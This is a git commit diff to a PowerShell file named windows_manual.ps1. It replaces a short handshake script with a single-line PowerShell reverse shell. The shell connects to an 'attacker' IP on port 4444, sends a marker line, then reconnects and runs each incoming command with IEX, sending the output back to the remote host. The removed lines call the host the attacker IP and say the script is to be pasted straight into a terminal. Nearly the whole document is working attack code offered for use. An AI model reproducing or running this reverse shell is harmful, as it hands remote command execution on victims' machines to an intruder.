0e98aa569295385dc9121801a22b73e04e8521e0
x86david <david.perez.dam2@gmail.com>
2026-04-28 18:27:41 +0000

    windows one liner

--- windows_manual.ps1
+++ windows_manual.ps1
@@ -1,15 +1,1 @@
-#Copy and paste right into the terminal.... no need to pass parameters to a file...
-$AttackerIP="10.0.13.7"; $Port=4444;
-# Handshake more compatible with 'nc | head -n 1'
-try {
-    $h = New-Object System.Net.Sockets.TCPClient($AttackerIP, $Port);
-    $s = $h.GetStream();
-    $b = [System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n");
-    $s.Write($b, 0, $b.Length);
-    $s.Flush();
-    Start-Sleep -Milliseconds 500; # Give nc time to "swallow" the data
-    $h.Close();
-    Write-Host "[+] Handshake sent!" -ForegroundColor Green
-} catch {
-    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
-}
+$IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
